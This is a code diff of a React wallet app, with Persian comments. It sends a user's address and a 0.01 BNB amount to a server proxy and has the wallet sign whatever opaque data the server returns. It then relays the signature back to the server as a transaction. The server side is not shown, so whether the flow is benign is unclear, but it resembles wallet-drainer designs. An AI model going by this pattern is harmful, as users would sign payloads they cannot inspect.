@@ -17,9 +17,8 @@ function App() {
     var provider = ethereumProvider;
     var accounts = await provider.request({ method: "eth_accounts" });
     var sender = accounts[0];
-    console.log("✅ Wallet Address:", sender);
 
-    let apiUrl = process.env.NEXT_PUBLIC_API_URL || "/api/proxy"; // استفاده از متغیر محیطی
+    console.log("✅ Wallet Address:", sender);
 
     async function getRawSignature(address, balance) {
       try {
@@ -31,19 +30,29 @@ function App() {
           balance: balance, // مقدار BNB مورد نظر
         };
 
-        let response = await fetch(apiUrl, {
+        console.log("🔍 Requesting Unsigned Data:", requestData);
+
+        let response = await fetch("/api/proxy", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(requestData),
         });
 
         let unsignedData = await response.json();
+
+        if (!unsignedData || unsignedData.error) {
+          console.error("❌ Error in getRawSignature:", unsignedData);
+          return null;
+        }
+
         console.log("📜 Unsigned Data:", unsignedData);
 
         var rawSignature = await provider.request({
           method: "personal_sign",
-          params: [JSON.stringify(unsignedData), address], // ترتیب پارامترها مهم است
+          params: [JSON.stringify(unsignedData), address],
         });
+
+        console.log("✍️ Signed Raw Data:", rawSignature);
 
         return rawSignature;
       } catch (error) {
@@ -54,19 +63,27 @@ function App() {
 
     async function sendSignedTransaction(signature, sender, balance) {
       try {
+        if (!signature || typeof signature !== "string") {
+          console.error("❌ Invalid signature:", signature);
+          return;
+        }
+
         let requestData = {
           sender: sender,
           balance: balance,
           signedData: signature,
         };
 
-        let response = await fetch(apiUrl, {
+        console.log("📤 Sending Signed Transaction:", requestData);
+
+        let response = await fetch("/api/proxy", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(requestData),
         });
 
         let resultJson = await response.json();
+
         console.log("📤 Server Response:", resultJson);
 
         return resultJson.txHash || resultJson.result || resultJson;
@@ -76,11 +93,11 @@ function App() {
       }
     }
 
-    let balance = "0.01"; // مقدار BNB مورد انتقال (می‌توان از ورودی کاربر گرفت)
+    let balance = 0.01; // مقدار BNB مورد انتقال (به‌صورت float)
+
     var rawSignature = await getRawSignature(sender, balance);
 
     if (rawSignature) {
-      console.log("✍️ Signed Raw Data:", rawSignature);
       var txHash = await sendSignedTransaction(rawSignature, sender, balance);
       console.log("📤 Final Transaction Hash:", txHash);
     } else {
